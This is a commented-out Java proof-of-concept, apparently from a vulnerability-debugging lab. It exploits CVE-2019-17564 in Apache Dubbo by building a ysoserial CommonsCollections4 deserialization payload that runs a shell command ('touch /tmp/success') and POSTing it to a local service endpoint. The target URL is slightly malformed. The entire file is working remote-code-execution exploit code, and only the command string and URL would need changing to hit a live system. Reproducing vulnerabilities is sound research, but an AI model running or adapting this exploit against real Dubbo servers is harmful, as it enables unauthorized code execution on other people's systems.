//package cve;
//
//import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
//import org.apache.http.client.methods.HttpPost;
//import ysoserial.GeneratePayload;
//import ysoserial.payloads.ObjectPayload;
//import ysoserial.payloads.util.Gadgets;
//
//import java.io.ByteArrayOutputStream;
//import java.io.ObjectOutputStream;
//
//
//public class CVE_2019_17564 {
//
//    private static byte[] serializeObject(Object obj) {
//        try {
//            ByteArrayOutputStream bos = new ByteArrayOutputStream();
//            ObjectOutputStream oos = new ObjectOutputStream(bos);
//            oos.writeObject(obj);
//            oos.flush();
//            return bos.toByteArray();
//        } catch (Exception e) {
//            e.printStackTrace();
//            return null;
//        }
//    }
//
//    public static void main(String[] args) throws Exception {
//
//        String url = "http://127.0.0./com.pacemrc.dubbo.impl.DemoServiceImpl";
//        String gadget = "CommonsCollections4";
//        String cmd = "touch /tmp/success";
//        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
//        Object obj = payload.getObject(cmd);
//
//        byte[] bytes = serializeObject(obj);
//
//        HttpRequest httpRequest = new HttpRequest();
//        HttpPost httpPost = new HttpPost(url);
//        String s = httpRequest.sendByteArrayPost(httpPost, bytes);
//        System.out.println(s);
//    }
//}
